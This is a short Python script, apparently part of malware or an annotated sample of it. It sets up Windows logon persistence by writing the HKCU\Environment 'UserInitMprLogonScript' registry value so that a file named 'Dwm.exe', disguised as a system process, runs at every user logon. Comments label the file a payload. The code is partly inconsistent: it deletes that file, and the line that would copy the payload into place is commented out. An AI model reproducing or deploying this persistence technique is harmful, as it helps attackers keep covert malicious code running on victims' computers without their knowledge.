import os, shutil, winreg

filedir = os.path.join(os.getcwd())
filename = 'Dwm.exe'
filepath = os.path.join(filedir, filename)

# Remove existing file if present
if os.path.isfile(filepath):
    os.remove(filepath)

# Copy payload to target directory (persistence location)
# This line commented but suggests intent:
# shutil.move(filename, filedir)

# Registry keys
reghive = winreg.HKEY_CURRENT_USER
regpath = r"Environment"  # HKCU\Environment key (executes on user logon)

# Add persistence (auto-start)
reg = winreg.ConnectRegistry(None, reghive)
key = winreg.OpenKey(reg, regpath, 0, access=winreg.KEY_WRITE)
winreg.SetValueEx(key, 'UserInitMprLogonScript', 0, winreg.REG_SZ, filepath)
